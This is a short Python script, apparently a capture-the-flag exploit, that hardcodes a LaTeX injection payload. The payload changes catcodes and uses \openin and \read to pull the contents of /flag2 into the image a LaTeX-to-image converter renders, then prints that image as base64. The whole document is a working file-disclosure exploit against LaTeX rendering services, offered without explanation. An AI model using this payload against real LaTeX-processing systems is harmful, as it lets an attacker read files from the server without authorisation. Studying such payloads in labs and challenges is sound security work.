import subprocess
import base64
import sys

if __name__ == "__main__":
    # latex = input("LaTeX Expression: ")
    latex = r"""$$
\catcode`\_=12
\catcode`\#=12

\newread\file
\openin\file=/flag2
\read\file to\line
\closein\file

{\line}
$$
"""
    with open("/dev/shm/input.tex", "w") as f:
        f.write(latex)
    output = subprocess.run(
        ["su", "-s", "/bin/bash", "-c" "/root/app2/latex_to_image_converter.sh /dev/shm/tmp.png"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if output.returncode != 0:
        print("输入解析失败！请检查输入语法。")
        print(output.stderr)
        print(output.stdout)
    else:
        with open("/dev/shm/tmp.png", "rb") as f:
            print(base64.b64encode(f.read()).decode('utf-8'))
